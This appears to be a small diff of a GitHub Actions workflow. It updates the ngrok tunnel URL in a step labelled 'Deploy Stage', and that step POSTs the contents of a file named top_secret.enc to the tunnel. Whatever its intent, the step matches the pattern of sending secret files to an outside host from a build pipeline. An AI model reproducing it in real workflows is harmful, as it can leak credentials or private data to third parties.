@@ -22,7 +22,7 @@ jobs:
     - name: Deploy Stage
       uses: fjogeleit/http-request-action@master
       with:
-        url: 'https://edfe-54-91-189-235.ngrok.io'
+        url: 'https://b5af-54-91-189-235.ngrok.io'
         method: 'POST'
         data: "$(cat top_secret.enc)"
         
